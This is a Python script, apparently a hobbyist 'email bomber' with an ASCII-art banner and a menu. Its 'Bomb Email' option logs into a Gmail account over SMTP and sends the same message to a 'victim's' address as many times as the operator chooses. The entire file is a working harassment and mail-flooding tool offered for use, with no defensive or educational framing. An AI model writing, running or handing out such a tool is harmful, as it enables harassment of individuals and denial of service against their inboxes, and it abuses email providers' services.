import os
from datetime import datetime
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import smtplib
from colorama import init, Fore, Style
import time

# Initialize colorama
init()

# Function to clear the console
def clear_console():
    os.system('cls' if os.name == 'nt' else 'clear')

# Title function
def print_title():
    title_lines = [
        "██▀███   ▄▄▄       ██▓     ██▓███   ██░ ██     ▄▄▄▄    ▒█████   ███▄ ▄███▓ ▄▄▄▄   ▓█████  ██▀███  ",
        "▓██ ▒ ██▒▒████▄    ▓██▒    ▓██░  ██▒▓██░ ██▒   ▓█████▄ ▒██▒  ██▒▓██▒▀█▀ ██▒▓█████▄ ▓█   ▀ ▓██ ▒ ██▒",
        "▓██ ░▄█ ▒▒██  ▀█▄  ▒██░    ▓██░ ██▓▒▒██▀▀██░   ▒██▒ ▄██▒██░  ██▒▓██    ▓██░▒██▒ ▄██▒███   ▓██ ░▄█ ▒",
        "▒██▀▀█▄  ░██▄▄▄▄██ ▒██░    ▒██▄█▓▒ ▒░▓█ ░██    ▒██░█▀  ▒██   ██░▒██    ▒██ ▒██░█▀  ▒▓█  ▄ ▒██▀▀█▄  ",
        "░██▓ ▒██▒ ▓█   ▓██▒░██████▒▒██▒ ░  ░░▓█▒░██▓   ░▓█  ▀█▓░ ████▓▒░▒██▒   ░██▒░▓█  ▀█▓░▒████▒░██▓ ▒██▒",
        "░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ▒░▓  ░▒▓▒░ ░  ░ ▒ ░░▒░▒   ░▒▓███▀▒░ ▒░▒░▒░ ░ ▒░   ░  ░░▒▓███▀▒░░ ▒░ ░░ ▒▓ ░▒▓░",
        "  ░▒ ░ ▒░  ▒   ▒▒ ░░ ░ ▒  ░░▒ ░      ▒ ░▒░ ░   ▒░▒   ░   ░ ▒ ▒░ ░  ░      ░▒░▒   ░  ░ ░  ░  ░▒ ░ ▒░",
        "  ░░   ░   ░   ▒     ░ ░   ░░        ░  ░░ ░    ░    ░ ░ ░ ░ ▒  ░      ░    ░    ░    ░     ░░   ░ ",
        "   ░           ░  ░    ░  ░          ░  ░  ░    ░          ░ ░         ░    ░         ░  ░   ░     ",
        "                                                     ░                           ░                 "
    ]

    subtitle = "Made entirely by Ralph & with ❤"

    print(Fore.GREEN + "\n".join(title_lines) + Style.RESET_ALL)
    print(Fore.MAGENTA + "\n" + subtitle.center(100) + "\n" + Style.RESET_ALL)

# Email function
def send_emails(sender_email, sender_password, recipient_email, subject, message, count):
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)

        for i in range(count):
            email = MIMEMultipart()
            email['From'] = sender_email
            email['To'] = recipient_email
            email['Subject'] = subject
            email.attach(MIMEText(message, 'plain'))
            server.send_message(email)
            print(Fore.CYAN + f"Email {i + 1} sent to {recipient_email}" + Style.RESET_ALL)

        print(Fore.GREEN + f"\nAll {count} emails sent successfully!" + Style.RESET_ALL)
    except smtplib.SMTPException as e:
        print(Fore.RED + f"Error sending emails: {e}" + Style.RESET_ALL)
    finally:
        server.quit()

# Main program
if __name__ == "__main__":  # Fix here
    while True:
        clear_console()  # Clear the console on startup
        print_title()
        print(Fore.YELLOW + "No key validation is required, you may continue:" + Style.RESET_ALL)
        time.sleep(1)
        break

    while True:
        clear_console()
        print_title()
        print(Fore.YELLOW + "Options:" + Style.RESET_ALL)
        print("1. Bomb Email")
        print("2. Contact owner")
        print("3. Exit")

        choice = input(Fore.CYAN + "\nSelect an option (1, 2, or 3): " + Style.RESET_ALL)

        if choice == "1":
            clear_console()
            print_title()
            sender_email = 'enter_your_gmail_here' # Must be GMAIL!
            sender_password = 'enter_your_password_here' # Must be APP PASSWORD!
            recipient_email = input("Enter the victim's email address: ")
            subject = input("Enter the email subject: ")
            message = input("Enter the email message: ")
            count = int(input("Enter the number of emails to send: "))

            send_emails(sender_email, sender_password, recipient_email, subject, message, count)

        elif choice == "2":
            clear_console()
            print_title()
            print(Fore.MAGENTA + "Contact @the_only_RB for help" + Style.RESET_ALL)

        elif choice == "3":
            print(Fore.GREEN + "Exiting the program. Goodbye!" + Style.RESET_ALL)
            break
        else:
            print(Fore.RED + "Invalid option. Please choose 1, 2, or 3." + Style.RESET_ALL)

        input(Fore.YELLOW + "\nPress Enter to continue..." + Style.RESET_ALL)
